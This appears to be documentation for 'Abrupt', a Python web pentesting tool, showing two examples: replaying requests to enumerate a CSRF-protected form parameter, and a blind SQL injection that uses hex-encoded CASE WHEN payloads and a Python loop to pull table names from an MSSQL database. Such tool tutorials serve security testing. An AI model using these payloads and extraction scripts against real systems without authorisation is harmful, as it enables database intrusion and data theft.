Real World Examples
===================

CSRF Protected Form
-------------------

One of the form you encounter has a CSRF protection. Though one of the
POST parameter is an upper case, and you'd like to enumerate the one that
have an impact on the application. Here is the POST request::
  
  POST /myapp/test.jsp HTTP/1.1
  Host: localhost
  User-Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
  Cookie: JSESSIONID=8AE12FEEDAA25F11F8AD4843AA60EF4A; 
  Content-Type: application/x-www-form-urlencoded

  my-app.nonce=4cc0b2a7-4982-4b7c-b696-d1378a56933e&memberRole=S&button=Submit

The enumeration goes in two steps, get a valid nonce by requesting the form
and then valid the form with a different letter for "memberRole". Here is
the script::

  from abrupt.all import *
  import re
  import string

  ss('my_session') 

  for u in list(string.uppercase):
    r_get()
    nonce = re.search(r"value=\'(.+)\'", r_get.response.readable_content).groups()[0]
    n = i_at(r_post, "4cc0b2a7-4982-4b7c-b696-d1378a56933e", [nonce,])
    its = i(n, memberRole=[u,])
    its()
    print its

So why Abrupt kick ass:

* 11 lines of code.
* Previously captured request are replayed (r_get and r_post variables are created
  with ``ss('my_session')`` which load a session).
* Execute requests easily: ``r_get()`` or ``its()``
* Extraction of the content of the page: ``r_get.response.readable_content``
* Injection of two manner:
 
  * Inject through a parameter name: ``i(n, memberRole=[u,])``
  * Replace a content, in case the parameter name break the python syntax: ``i_at(r_post, "4cc0b2a7-4982-4b7c-b696-d1378a56933e", [nonce,])``

The last argument of both injection is a list which contains the payloads, in both case,
the list only contains one value. For more informations, see :func:`i` and :func:`i_at`.


Blind SQL Injection
-------------------
After couple hours spend on a web application testing, you finally find a SQLi
in on of the URL parameters. Some filtering are made and the only response you get
is a generic error. You've tried to set up sqlmap but it just can't recognise your
blind injection. Time to go home? Nop, time to start Abrupt!

Here is an example of the injection::
 
  /index.jsp?ordering=1,(SELECT+CASE+WHEN+(boolean_expression)+
             THEN+1+ELSE+(SELECT+1+WHERE+1%3dCHAR(00))+END)--

After some tests, you find out that the quotes are filtered. We are going to 
find out the tables names and columns of this database using hexadecimal encoded
string.

Here is the request to test if there exists some table starting with 'A'::

  /index.jsp?ordering=1,(SELECT+CASE+WHEN+(
        SELECT+count(name)+from+sysobjects+
               where+xtype%3d0x55+
               and+name+like+cast(0x4125+as+varchar(64))
        )+BETWEEN+1+AND+100
        +THEN+1+ELSE+(SELECT+1+WHERE+1%3dCHAR(00))+END)--

From now, we should test each characters. For each character, if an error is
returned, we will then try this character with one other append and so on.
With this approach, we don't have an exponential number of case to test.

Here an example of code to get the table names::

  from abrupt.all import *

  r = load('r')

  def extract_correct_payload(rs):
    """
    From a RequestSet, find the one considered as "true"
    and returns all the corresponding payloads
    """
    correct_requests = rs.filter(response__status='500')
    hex_payloads = [ x[7:-2] for x in correct_requests.extract("payload")]
    char_payloads = ["".join([chr(int("0x"+"".join(l[i:i+2]),16))
                     for i in range(0,len(l),2)]) for l in hex_payloads]
                     # Convert the payloads from hexadecimal to string
    return char_payloads

  def create_payloads(init_p):
    """
    Generate the payloads. First convert to hex then derivate.
    """
    cur_hex_payloads = ["0x" + "".join([ hex(ord(x))[2:] for x in p]) for p in init_p]
    new_hex_payloads = [ x + hex(ord(h))[2:]+"25"
                         for x in cur_hex_payloads for h in payloads["printable"]]
    return new_hex_payloads


  payloads["my"] = ["0x" + "".join([ hex(ord(x))[2:] for x in p])+"25"
                     for p in payloads["printable"]]
  rss = i_at(r, 100, payload="my")
  rss()

  while True:
    td = extract_correct_payload(rss)
    if not td:
      break
    print td
    payloads["my"] = create_payloads(td)
    rss = i_at(r, 100, payload="my")
    rss()

So, why Abrupt is really helpful for this kind of job:  
  
* Restoring request: ``r = load('r')``
* Easy filtering on requests: ``rs.filter(response__status='200')``
* Quick extraction: ``correct_requests.extract("payload")``
* Generation of requests: ``rss = i_at(r, 100, payload="my")``

From there, any other exploitation could be based on that one (row enumeration).
(Here, we don't consider breaking out of the database). 

